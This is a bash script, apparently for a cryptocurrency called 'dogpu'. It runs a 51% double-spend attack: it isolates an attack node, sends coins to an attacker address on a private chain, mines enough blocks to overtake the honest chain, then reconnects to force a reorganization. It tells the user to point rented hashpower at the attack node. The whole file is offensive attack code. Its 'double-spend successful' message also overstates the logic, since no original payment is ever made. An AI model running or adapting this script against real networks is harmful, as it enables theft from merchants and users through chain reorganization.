#!/bin/bash
echo "💥 EXECUTING DOUBLE-SPEND ATTACK!"
echo "================================="

# Get current block height
HONEST_HEIGHT=$(./dogpu-cli -datadir=honest_node getblockcount)
echo "📊 Current honest chain height: $HONEST_HEIGHT"

# Disconnect attack node from network
echo "🔌 Isolating attack node from network..."
./dogpu-cli -datadir=attack_node disconnectnode "127.0.0.1:8333"

# Generate attacker address
ATTACKER_ADDR=$(./dogpu-cli -datadir=attack_node getnewaddress)
echo "🎯 Attacker address: $ATTACKER_ADDR"

# Create conflicting transaction on private chain
echo "💰 Creating conflicting transaction on private chain..."
ATTACK_TXID=$(./dogpu-cli -datadir=attack_node sendtoaddress $ATTACKER_ADDR 1000)
echo "Attack transaction ID: $ATTACK_TXID"

# Mine private chain faster than honest chain
echo "⛏️  Mining private chain with your >51% hashpower..."
echo "💡 Point your rented hashpower to attack node (port 8335) NOW!"
echo ""
echo "🔥 Mining blocks to overtake honest chain..."

# Mine enough blocks to overtake honest chain
BLOCKS_TO_MINE=$((HONEST_HEIGHT + 10))
echo "📊 Mining $BLOCKS_TO_MINE blocks on private chain..."

./dogpu-cli -datadir=attack_node generate $BLOCKS_TO_MINE

# Check private chain height
ATTACK_HEIGHT=$(./dogpu-cli -datadir=attack_node getblockcount)
echo "📊 Private chain height: $ATTACK_HEIGHT"

if [ $ATTACK_HEIGHT -gt $HONEST_HEIGHT ]; then
    echo "✅ Private chain is longer! Ready to reorganize network."
    
    # Reconnect to network to broadcast longer chain
    echo "🌐 Reconnecting to network to broadcast longer chain..."
    ./dogpu-cli -datadir=attack_node addnode "127.0.0.1:8333" "add"
    
    sleep 10
    
    # Check if reorganization happened
    NEW_HONEST_HEIGHT=$(./dogpu-cli -datadir=honest_node getblockcount)
    echo "📊 Honest node height after reorg: $NEW_HONEST_HEIGHT"
    
    if [ $NEW_HONEST_HEIGHT -eq $ATTACK_HEIGHT ]; then
        echo "🎉 SUCCESS! 51% ATTACK COMPLETED!"
        echo "✅ Blockchain reorganized to attacker's chain"
        echo "💰 Double-spend successful - original transaction reversed"
        echo "🔥 You now control the blockchain with >51% hashpower"
    else
        echo "⚠️  Reorganization may still be in progress..."
        echo "💡 Check node status in a few minutes"
    fi
else
    echo "❌ Private chain not long enough. Need more hashpower!"
    echo "💡 Ensure your rented hashpower is pointed to port 8335"
fi
